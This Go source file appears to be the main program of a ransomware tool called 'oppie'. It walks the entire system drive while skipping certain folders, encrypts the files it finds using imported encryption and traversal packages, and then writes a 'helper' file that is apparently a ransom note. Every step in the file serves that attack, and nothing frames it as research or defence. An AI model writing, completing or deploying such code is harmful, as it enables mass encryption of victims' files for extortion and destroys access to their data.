package main

import (
	"fmt"

	"github.com/savi2w/oppie/encrypt"
	"github.com/savi2w/oppie/fsutil"
	"github.com/savi2w/oppie/osutil"
	"github.com/savi2w/oppie/storage"
	"github.com/savi2w/oppie/traversal"
)

func main() {
	badger, err := storage.New()
	if err != nil {
		fmt.Printf("Error starting Badger database: %s\n", err.Error())
		return
	}

	defer badger.Close()

	core, err := encrypt.New()
	if err != nil {
		fmt.Printf("Error starting encryption core: %s\n", err.Error())
		return
	}

	traversal := traversal.New(badger, core)

	drive := osutil.GetSystemDrive()
	ignore := osutil.GetIgnoreFolders()

	traversal.Walker.WaitGroup.Add(1)
	traversal.Walker.Walk(drive, ignore)
	traversal.Walker.WaitGroup.Wait()

	fmt.Println("Done walking...")

	traversal.Encryptor.Iterate()
	traversal.Encryptor.WaitGroup.Wait()

	fmt.Println("Done iterating...")

	if err := fsutil.WriteHelper(); err != nil {
		fmt.Printf("Error writing helper: %s\n", err.Error())
		return
	}
}
